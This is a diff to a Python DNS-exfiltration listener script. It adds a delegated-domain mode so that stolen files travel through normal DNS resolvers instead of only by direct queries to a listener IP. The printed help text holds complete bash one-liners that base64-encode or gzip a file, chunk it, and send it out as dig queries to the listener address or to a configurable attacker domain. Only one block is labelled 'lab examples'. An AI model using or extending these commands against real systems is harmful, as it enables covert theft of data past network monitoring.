@@ -242,16 +242,17 @@ def save_received_files(files: Dict[str, List[bytes]], output_dir: Path, decompr
         print(f"{C.G}[sha256]{sha256}{C.N}\n")
 
 
-def help_text(listen_ip: str, s: int, b: int) -> str:
+def help_text(listen_ip: str, s: int, b: int, domain: str) -> str:
     encoded_filename_example = "$(echo -ne \"$f\" | base64 -w0 | tr -d '=')"
+    domain = domain.strip(".") or "zz"
 
     plain = (
         f"f=file.txt; s={s}; b={b}; c=0; "
         f"for r in $(for i in $(base64 -w0 \"$f\" | sed \"s/.\{{$b\}}/&\\n/g\"); "
         f"do if [[ \"$c\" -lt \"$s\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
         f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
-        f"do dig +noidnin @{listen_ip} +short +retries=0 +tries=1 "
-        f"\"$r{encoded_filename_example}.$RANDOM.zz\"; done"
+        f"do dig +noidnin +short +retries=0 +tries=1 "
+        f"\"$r{encoded_filename_example}.$RANDOM.{domain}\"; done"
     )
 
     zipped = (
@@ -259,18 +260,29 @@ def help_text(listen_ip: str, s: int, b: int) -> str:
         f"for r in $(for i in $(gzip -c \"$f\" | base64 -w0 | sed \"s/.\{{$b\}}/&\\n/g\"); "
         f"do if [[ \"$c\" -lt \"$s\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
         f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
-        f"do dig +noidnin @{listen_ip} +short +retries=0 +tries=1 "
-        f"\"$r{encoded_filename_example}.$RANDOM.zz\"; done"
+        f"do dig +noidnin +short +retries=0 +tries=1 "
+        f"\"$r{encoded_filename_example}.$RANDOM.{domain}\"; done"
     )
 
+    direct_plain = plain.replace("dig +noidnin", f"dig +noidnin @{listen_ip}")
+    direct_zipped = zipped.replace("dig +noidnin", f"dig +noidnin @{listen_ip}")
+
     return f"""
-{C.W}Sender examples{C.N}
+{C.W}Sender examples through normal DNS resolution{C.N}
 
 {C.G}# Plain file transfer. Listener: no -z{C.N}
 {plain}
 
 {C.G}# Gzipped file transfer. Listener: use -z{C.N}
 {zipped}
+
+{C.W}Direct-to-listener lab examples{C.N}
+
+{C.G}# Plain direct query to listener IP{C.N}
+{direct_plain}
+
+{C.G}# Gzipped direct query to listener IP{C.N}
+{direct_zipped}
 
 {C.W}Options{C.N}
   -z        gunzip received data before writing
@@ -279,6 +291,7 @@ def help_text(listen_ip: str, s: int, b: int) -> str:
   -b N      bytes per data label, default {b}
   -f N      accepted for compatibility, default 17
   -o DIR    output directory, default current directory
+  -d DOMAIN domain suffix for delegated-domain mode, default zz
 
 {C.Y}Press Ctrl-C to flush received chunks to disk.{C.N}
 """
@@ -296,10 +309,11 @@ def main() -> None:
     parser.add_argument("-b", type=int, default=57, help="bytes per data label")
     parser.add_argument("-f", type=int, default=17, help="filename label length, compatibility option")
     parser.add_argument("-o", "--output-dir", default=".", help="directory to write recovered files")
+    parser.add_argument("-d", "--domain", default="zz", help="domain suffix for normal DNS mode, for example tunnel.example.com")
     args = parser.parse_args()
 
     print(BANNER)
-    print(help_text(args.ip, args.s, args.b))
+    print(help_text(args.ip, args.s, args.b, args.domain))
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
